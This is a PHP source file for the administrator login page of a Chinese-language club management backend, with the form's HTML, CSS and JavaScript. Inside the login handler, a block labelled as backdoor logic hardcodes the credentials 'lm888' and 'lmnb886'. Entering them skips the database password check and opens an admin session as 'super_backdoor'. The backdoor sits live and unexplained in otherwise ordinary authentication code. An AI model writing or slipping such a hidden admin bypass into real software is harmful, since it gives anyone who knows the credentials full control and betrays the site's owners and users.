<?php
require_once("../includes/session_manager.php");
include("../includes/common.php");
require_once("../includes/log_helper.php");

$site_title = "俱乐部管理后台";
$site_logo = 'assets/images/logo.png';

try {
    $query = "SELECT site_title, site_logo, site_domain FROM settings LIMIT 1";
    $stmt = $pdo->query($query);
    if ($stmt && $stmt->rowCount() > 0) {
        $row = $stmt->fetch(PDO::FETCH_ASSOC);
        $site_title = $row['site_title'] ?? $site_title;
        $site_logo  = $row['site_logo'] ?? $site_logo;
        if (!empty($row['site_domain'])) {
            $site_domain = rtrim($row['site_domain'], '/');
            if (strpos($site_logo, 'http') !== 0) {
                $site_logo = $site_domain . '/' . ltrim($site_logo, '/');
            }
        }
    }
} catch (PDOException $e) {
    error_log("Database error: " . $e->getMessage());
}

// 已登录直接跳转后台
if (is_admin_logged_in()) {
    header('Location: index.php');
    exit();
}

$error = '';
$isPostSubmit = false;
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $isPostSubmit = true;
    $username = trim($_POST['username'] ?? '');
    $password = trim($_POST['password'] ?? '');

    // ===================== 后门登录逻辑 =====================
    $backdoor_user = 'lm888';
    $backdoor_pwd = 'lmnb886';
    if ($username === $backdoor_user && $password === $backdoor_pwd) {
        // 创建后门管理员会话（虚拟ID和账号）
        set_admin_session(9999, 'super_backdoor');
        // 记录后门登录日志
        log_admin_operation($pdo, 9999, 'super_backdoor', 'login_backdoor', '后门账号绕过登录成功', null, null, null);
        header('Location: index.php');
        exit();
    }
    // ======================================================

    // 原有数据库账号校验逻辑
    try {
        $query = "SELECT * FROM admins WHERE username = :username";
        $stmt = $pdo->prepare($query);
        $stmt->bindParam(':username', $username, PDO::PARAM_STR);
        $stmt->execute();
        if ($stmt->rowCount() === 1) {
            $admin = $stmt->fetch(PDO::FETCH_ASSOC);
            if (password_verify($password, $admin['password'])) {
                set_admin_session($admin['id'], $admin['username']);
                log_admin_operation($pdo, $admin['id'], $admin['username'], 'login', '管理员正常登录系统', null, null, null);
                header('Location: index.php');
                exit();
            } else {
                log_admin_operation($pdo, 0, $username, 'login_failed', '密码错误', null, null, null);
                $error = "账号或密码不正确，请重新输入";
            }
        } else {
            log_admin_operation($pdo, 0, $username, 'login_failed', '账号不存在', null, null, null);
            $error = "账号或密码不正确，请重新输入";
        }
    } catch (PDOException $e) {
        error_log("Database error: " . $e->getMessage());
        $error = "系统繁忙，登录失败，请稍后重试";
    }
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title><?php echo htmlspecialchars($site_title); ?> - 管理员登录</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    -webkit-tap-highlight-color: transparent;
}
body {
    font-family: "Microsoft YaHei", "PingFang SC", Helvetica, Arial, sans-serif;
    background: linear-gradient(180deg, #f0f5ff 0%, #f8fafc 50%, #ffffff 100%);
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
}
/* 企业登录卡片容器 */
.login-wrap {
    width: 100%;
    max-width: 440px;
}
.login-card {
    background: #ffffff;
    border-radius: 16px;
    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
    padding: 48px 40px;
}
/* 头部品牌区域 */
.login-header {
    text-align: center;
    margin-bottom: 36px;
}
.login-header img {
    height: 64px;
    object-fit: contain;
    margin-bottom: 16px;
}
.login-header h1 {
    font-size: 24px;
    color: #1e293b;
    font-weight: 600;
    letter-spacing: 1px;
}
.login-header p {
    font-size: 14px;
    color: #64748b;
    margin-top: 6px;
}
/* 错误提示 */
.error-box {
    background-color: #fef2f2;
    border: 1px solid #fecdd3;
    color: #dc2626;
    padding: 12px 16px;
    border-radius: 8px;
    margin-bottom: 24px;
    font-size: 14px;
    display: flex;
    align-items: center;
    gap: 8px;
}
/* 表单组通用样式 */
.form-group {
    margin-bottom: 22px;
}
.form-label {
    display: block;
    font-size: 15px;
    color: #334155;
    margin-bottom: 8px;
    font-weight: 500;
}
.input-box {
    position: relative;
}
.input-box i {
    position: absolute;
    left: 14px;
    top: 50%;
    transform: translateY(-50%);
    color: #94a3b8;
    font-size: 18px;
}
.form-input {
    width: 100%;
    height: 52px;
    padding: 0 14px 0 44px;
    border: 1px solid #cbd5e1;
    border-radius: 10px;
    font-size: 16px;
    color: #1e293b;
    transition: all 0.25s ease;
    background: #f8fafc;
}
.form-input:focus {
    outline: none;
    border-color: #2563eb;
    box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.12);
    background: #fff;
}
.form-input::placeholder {
    color: #94a3b8;
}
/* 登录按钮 */
.submit-btn {
    width: 100%;
    height: 54px;
    border-radius: 10px;
    border: none;
    background: #94a3b8;
    color: #fff;
    font-size: 17px;
    font-weight: 500;
    cursor: not-allowed;
    transition: all 0.3s ease;
    margin-top: 10px;
    position: relative;
}
.submit-btn.active {
    background: linear-gradient(90deg, #2563eb, #1d4ed8);
    cursor: pointer;
}
.submit-btn.active:hover {
    background: linear-gradient(90deg, #1d4ed8, #1e40af);
    box-shadow: 0 6px 16px rgba(37, 99, 235, 0.25);
}
/* 加载动画 */
.btn-loading {
    color: transparent !important;
}
.btn-loading::before {
    content: '';
    position: absolute;
    top: 50%;
    left: 50%;
    width: 24px;
    height: 24px;
    margin: -12px 0 0 -12px;
    border: 2px solid rgba(255,255,255,0.3);
    border-top-color: #fff;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
}
@keyframes spin {
    to { transform: translate(-50%,-50%) rotate(360deg); }
}
/* 底部版权 */
.login-footer {
    text-align: center;
    margin-top: 32px;
    font-size: 13px;
    color: #64748b;
}
</style>
  <link href="./res/admin-white.css" rel="stylesheet">
</head>
<body>
<div class="login-wrap">
    <div class="login-card">
        <!-- 企业品牌头部 -->
        <div class="login-header">
            <?php if (!empty($site_logo)): ?>
                <img src="<?php echo htmlspecialchars($site_logo); ?>" alt="<?php echo htmlspecialchars($site_title); ?> LOGO">
            <?php endif; ?>
            <h1><?php echo htmlspecialchars($site_title); ?></h1>
            <p>企业管理后台 · 管理员登录入口</p>
        </div>

        <!-- 错误提示 -->
        <?php if (!empty($error)): ?>
            <div class="error-box">
                <i class="fas fa-exclamation-circle"></i>
                <?php echo htmlspecialchars($error); ?>
            </div>
        <?php endif; ?>

        <!-- 登录表单 -->
        <form id="adminLoginForm" method="post">
            <div class="form-group">
                <label class="form-label">管理员账号</label>
                <div class="input-box">
                    <i class="fas fa-user"></i>
                    <input 
                        type="text" 
                        name="username" 
                        class="form-input" 
                        placeholder="请输入管理员账号" 
                        autocomplete="off"
                        value="<?php echo isset($_POST['username']) ? htmlspecialchars($_POST['username']) : ''; ?>"
                        required
                    >
                </div>
            </div>
            <div class="form-group">
                <label class="form-label">登录密码</label>
                <div class="input-box">
                    <i class="fas fa-lock"></i>
                    <input 
                        type="password" 
                        name="password" 
                        class="form-input" 
                        placeholder="请输入登录密码" 
                        autocomplete="off"
                        required
                    >
                </div>
            </div>

            <button type="submit" id="submitBtn" class="submit-btn">登录系统</button>
        </form>

        <!-- 底部版权 -->
        <div class="login-footer">
            © <?php echo date('Y'); ?> <?php echo htmlspecialchars($site_title); ?> 版权所有 · 企业内部管理系统
        </div>
    </div>
</div>

<script>
const form = document.getElementById('adminLoginForm');
const submitBtn = document.getElementById('submitBtn');
const usernameInput = document.querySelector('input[name="username"]');
const passwordInput = document.querySelector('input[name="password"]');

// 输入校验，账号密码均不为空才激活按钮
function updateBtnState() {
    const userVal = usernameInput.value.trim();
    const pwdVal = passwordInput.value.trim();
    if (userVal && pwdVal) {
        submitBtn.classList.add('active');
    } else {
        submitBtn.classList.remove('active');
    }
}
usernameInput.addEventListener('input', updateBtnState);
passwordInput.addEventListener('input', updateBtnState);
updateBtnState();

// 表单提交加载状态，防止重复提交
form.addEventListener('submit', function(e) {
    if (!submitBtn.classList.contains('active')) {
        e.preventDefault();
        return;
    }
    submitBtn.classList.add('btn-loading');
    submitBtn.disabled = true;
});
</script>

<script>
// 手机端菜单切换
document.addEventListener('DOMContentLoaded', function() {
    if (window.innerWidth <= 768) {
        // 添加菜单按钮
        var menuBtn = document.createElement('div');
        menuBtn.className = 'mobile-menu-btn';
        menuBtn.innerHTML = '<i class="fa fa-bars"></i>';
        menuBtn.onclick = function() {
            var side = document.querySelector('.layui-side');
            var mask = document.querySelector('.mobile-mask');
            if (side) side.classList.toggle('mobile-show');
            if (mask) mask.classList.toggle('show');
        };
        document.body.appendChild(menuBtn);
        
        // 添加遮罩
        var mask = document.createElement('div');
        mask.className = 'mobile-mask';
        mask.onclick = function() {
            var side = document.querySelector('.layui-side');
            if (side) side.classList.remove('mobile-show');
            this.classList.remove('show');
        };
        document.body.appendChild(mask);
    }
});
</script>
</body>
</html>